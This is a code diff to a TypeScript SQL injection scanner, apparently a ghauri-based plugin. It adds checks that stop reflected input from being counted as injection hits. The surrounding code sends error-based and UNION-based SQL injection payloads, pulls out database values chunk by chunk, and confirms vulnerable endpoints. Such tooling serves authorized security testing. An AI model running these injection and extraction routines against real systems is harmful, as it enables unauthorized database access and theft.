@@ -607,6 +607,42 @@ function confirmErrorBased(baselineBody: string, injectedBody: string, titleDbms
   return null;
 }
 
+// --- Reflection guards --------------------------------------------------------------------
+// Some endpoints echo the submitted parameter straight back into the response (e.g. a search
+// /filter API that returns the applied `filters`, or any form that reprints your input). That
+// echo contains our marker and our payload text verbatim, which naively looks like an
+// error-based hit or an extracted value. These helpers tell reflection apart from a genuine
+// DBMS signal, killing the whole class of false positives.
+
+// Remove verbatim (and commonly re-encoded) echoes of what we injected, so marker/error checks
+// only see text the server produced on its own.
+function stripEchoes(body: string, ...injected: string[]): string {
+  let out = body;
+  for (const inj of injected) {
+    if (!inj || inj.length < 3) continue;
+    const variants = new Set<string>([
+      inj,
+      encodeURIComponent(inj),
+      inj.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;"),
+    ]);
+    for (const vv of variants) if (vv) out = out.split(vv).join("");
+  }
+  return out;
+}
+
+// Pull a ~value~ marker out of a response, but reject it when the value is just our payload
+// bounced back (a slice of what we injected, a CAST/CONCAT wrapper fragment, a hex delimiter,
+// or the detection marker) rather than real extracted data.
+function markerValue(body: string, injectedPayload: string): string | null {
+  const m = body.match(/~([^~]*)~/);
+  if (!m || m[1] === "") return null;
+  const val = m[1];
+  if (val.length >= 4 && injectedPayload.includes(val)) return null;              // verbatim echo (a slice of our payload)
+  if (/CAST\s*\(|CONCAT\s*\(|0x7e|@@|STRING_AGG|SUBSTR(ING)?\s*\(|NVARCHAR\s*\(/i.test(val)) return null; // wrapper fragment echo
+  if (val.includes(GH_ERROR_MARKER)) return null;                                 // detection-marker echo
+  return val;
+}
+
 // Strip per-request dynamic noise so two logically-identical pages compare as identical:
 // long random tokens (ViewState/CSRF/session ids) and all digit runs (timestamps, counters).
 function normalizeBody(s: string): string {
@@ -1142,10 +1178,10 @@ async function extractReflected(v: InjectionVector, sqlExpr: string, sid: string
         const payload = `${v.prefix}AND ${errorMarkerPayload("mysql", inner)}${v.suffix}`;
         const r = await sendVectorPayload(v, payload, sid);
         if (!r) break;
-        const m = r.body.match(/~([^~]*)~/);
-        if (!m || m[1] === "") break;
-        result += m[1];
-        if (m[1].length < chunk) break;
+        const val = markerValue(r.body, payload);   // null = nothing, or just our payload reflected
+        if (val === null) break;
+        result += val;
+        if (val.length < chunk) break;
         offset += chunk;
       }
       return result.length > 0 ? result : null;
@@ -1154,8 +1190,8 @@ async function extractReflected(v: InjectionVector, sqlExpr: string, sid: string
     const payload = `${v.prefix}AND ${errorMarkerPayload(v.dbms, sqlExpr)}${v.suffix}`;
     const r = await sendVectorPayload(v, payload, sid);
     if (r) {
-      const m = r.body.match(/~([^~]*)~/);
-      if (m && m[1] !== "") return m[1];
+      const val = markerValue(r.body, payload);
+      if (val !== null) return val;
     }
     return null;
   }
@@ -1168,8 +1204,8 @@ async function extractReflected(v: InjectionVector, sqlExpr: string, sid: string
     const payload = `${v.prefix}UNION ALL SELECT ${concat}${v.suffix}`;
     const r = await sendVectorPayload(v, payload, sid);
     if (r) {
-      const m = r.body.match(/~([^~]*)~/);
-      if (m && m[1] !== "") return m[1];
+      const val = markerValue(r.body, payload);
+      if (val !== null) return val;
     }
     return null;
   }
@@ -1607,6 +1643,19 @@ export function init(sdkInstance: any) {
         }
       }
 
+      // Reflection probe: does this endpoint echo the submitted value back into the response?
+      // If so, our markers/payloads appear in the body as plain reflection and must NOT be
+      // mistaken for a DBMS error or extracted data. Gates the error/union marker checks below.
+      let paramReflects = false;
+      {
+        const canary = `qZx${generateRandom()}${generateRandom()}Xzq`;
+        const rp = await sendRequest(requestId, param.name, param.type, param.value + canary, rawRequest, sessionId);
+        if (rp && rp.body.includes(canary)) {
+          paramReflects = true;
+          sendLog(`[i] Param "${param.name}" is reflected in the response — reflection guard ON (echoed markers won't count as SQLi).`, "warn");
+        }
+      }
+
       // Best-known DBMS for this param, refined as techniques confirm it (time-based is authoritative)
       let confirmedDbms = heuristicDbms;
 
@@ -1628,8 +1677,14 @@ export function init(sdkInstance: any) {
 
             // Confirm: ghauri extraction marker surfaced (and absent from baseline) OR a
             // genuinely new DBMS error that the baseline did not already show.
-            const markerHit = resp.body.includes(GH_ERROR_MARKER) && !baselineResp.body.includes(GH_ERROR_MARKER);
-            const errConfirm = confirmErrorBased(baselineResp.body, resp.body, ghGroupToCode(entry.dbms));
+            // Reflection guard: strip any verbatim echo of what we injected, and when the param
+            // is known to reflect, never trust the raw marker (it's just our payload bounced back)
+            // — only a real DBMS error signature (which reflection cannot fake) confirms.
+            const injectedEcho = stripEchoes(resp.body, fullPayload, probe);
+            const markerHit = !paramReflects
+              && injectedEcho.includes(GH_ERROR_MARKER)
+              && !baselineResp.body.includes(GH_ERROR_MARKER);
+            const errConfirm = confirmErrorBased(baselineResp.body, injectedEcho, ghGroupToCode(entry.dbms));
             if (markerHit || errConfirm) {
               const detectedDbms = (errConfirm && errConfirm.dbms !== "unknown") ? errConfirm.dbms
                 : (ghGroupToCode(entry.dbms) !== "unknown" ? ghGroupToCode(entry.dbms) : confirmedDbms);
@@ -1855,7 +1910,10 @@ export function init(sdkInstance: any) {
               const versionFullPayload = `${param.value}${pref}${versionPayload}${suf}`;
               const versionResp = await sendRequest(requestId, param.name, param.type, versionFullPayload, rawRequest, sessionId);
 
-              if (versionResp && versionResp.body.match(/\d+\.\d+\.\d+|MariaDB|PostgreSQL|Microsoft|Oracle/i)) {
+              // Reflection guard: strip any echo of the payload first, so an echoed `@@VERSION`
+              // (or the raw value) can't masquerade as a real version banner.
+              const versionBody = versionResp ? stripEchoes(versionResp.body, versionFullPayload, versionPayload) : "";
+              if (versionResp && versionBody.match(/\d+\.\d+\.\d+|MariaDB|PostgreSQL|Microsoft|Oracle/i)) {
                 sendLog(`[+] VULNERABLE! UNION-based SQLi confirmed`, "success");
                 sendLog(`    Columns: ${nullCount}`, "success");
 
